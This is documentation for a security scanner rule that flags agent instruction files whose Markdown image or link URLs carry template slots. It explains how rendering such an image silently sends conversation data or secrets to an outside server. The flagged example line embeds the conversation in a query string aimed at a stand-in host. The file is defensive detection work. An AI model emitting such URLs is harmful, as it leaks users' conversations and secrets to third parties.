# RS-EXF-001: Image or link URL with dynamic data

| Severity | Category | Applies to |
|---|---|---|
| high | exfiltration | skill, instructions, command, agent |

## What it detects

A Markdown image or link (or HTML <img>) URL contains a template or variable slot. When an agent fills it in and the client renders the image, the data is sent to that server without a click. Use static URLs.

## Why it matters

Markdown images and links are fetched automatically by many clients. If the URL contains data (a variable, a secret, file content), rendering it sends that data to the URL's owner without any visible action.

## Example

Flagged:

```text
![status](https://x.example/p.png?d={{conversation}})
```

Not flagged:

```text
![badge](https://x.example/badge.svg)
![logo](https://x.example/logo.png?v=2)
```

## How to fix

Use static URLs. Never build image or link URLs from secrets, environment variables, or file content.

To accept a finding on purpose, add a `[[suppress]]` entry with a `reason` to `rulesift.toml`, or record it in a baseline (`rulesift scan --baseline`); see docs/configuration.md.

## References

- <https://embracethered.com/blog/posts/2023/bing-chat-data-exfiltration-poc-and-fix/>
- <https://simonwillison.net/2025/jun/16/the-lethal-trifecta/>

## Affected tools

Agent Skills, AGENTS.md, Claude Code, Cursor, GitHub Copilot / VS Code, Windsurf / Devin Desktop, Cline, Gemini CLI, Roo Code, Continue, Zed, JetBrains Junie, Kiro, Amazon Q Developer
